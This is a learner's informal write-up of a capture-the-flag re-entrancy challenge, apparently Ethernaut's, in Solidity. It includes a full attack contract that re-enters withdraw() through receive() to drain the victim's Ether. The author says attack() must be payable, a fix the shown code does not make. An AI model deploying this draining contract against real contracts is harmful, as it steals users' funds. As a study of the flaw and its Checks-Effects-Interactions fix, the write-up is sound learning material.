## Re-entrancy

1. Again when I used to watch austin griffith explaining how to become a ethereum builder very fast... and he ran scaffold eth and says to learn re-entrancy and i was not able to setup scafold-eth multiple times... it works now but sometimes when i boot a new iso, there are occassions it gives weird errors... But i learned from him alot... I knew re-entrancy for a while now and is my first vulnerability that i learnt... i heard market manipulation etc etc before re-ent but ik the code of re-ent.

2. Here, you already have learned how to invoke fallback() or revoke() in previous challenges so using that when an external call is made you re-enter the function provided state is not changed and state is changed after the the call().

3. you have to first donate so that the mapping has your donation and then you can withdraw the amount you donated also have a receive function to re-enter withdraw again.

4. The only hard part here is writing receive()/ fallback(), where you need to calculate how much eth do you want to withdraw, suppose you have donated 0.9 eth but you try to withdraw(1 ether) then transaction fails.

> Code

```solidity
interface Re_ent  {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    Re_ent instance;

    constructor (address _address) {
        instance= Re_ent(_address);
    }

    function attack() public {
        instance.donate{value: 1e17}(address(this));
        instance.withdraw(1e17);
    }

    receive() external payable {
        // below lines were hardest to write
        // since we have to drain all the funds from instance
        uint eth_balanceOf_inst = address(instance).balance;
        // if my balance mapping in instance is less than the eth_balance of instance then take my balance else take the rest

        uint withdraws_this = 1e17 < eth_balanceOf_inst ? 1e17 : eth_balanceOf_inst;

        if (eth_balanceOf_inst>0){
            instance.withdraw(withdraws_this);
        }
    }

    // this is not necessary but i will try to get my eth and additional eth i get by solving
    function withdrawHackedEth() public {
        (bool sent,) =msg.sender.call{value: address(this).balance}("");
        require(sent);
    }
}
```

5. I failed using above code i tried few things and i was failing most of the times but the issue was that `function attack() public` in contract Attack needs to be payable.

6. success

> notes : I forget the Checks-Effects-Interactions pattern name... ik the procedure but the name ...

> There is another AAA - \_\_\_\_ Affirm A... i will update this later... it was mentioned by Patrick Collins
